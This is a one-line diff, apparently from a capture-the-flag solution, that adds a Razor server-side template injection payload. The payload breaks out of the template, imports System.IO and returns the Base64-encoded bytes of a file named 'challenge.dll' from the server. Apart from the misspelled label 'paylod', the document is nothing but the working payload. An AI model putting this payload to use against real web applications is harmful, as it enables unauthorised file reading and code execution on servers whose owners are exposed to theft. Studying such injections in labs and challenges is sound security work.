@@ -1,0 +1,1 @@
+paylod: `1)@using System.IO@(Convert.ToBase64String(File.ReadAllBytes("challenge.dll")))@(1`
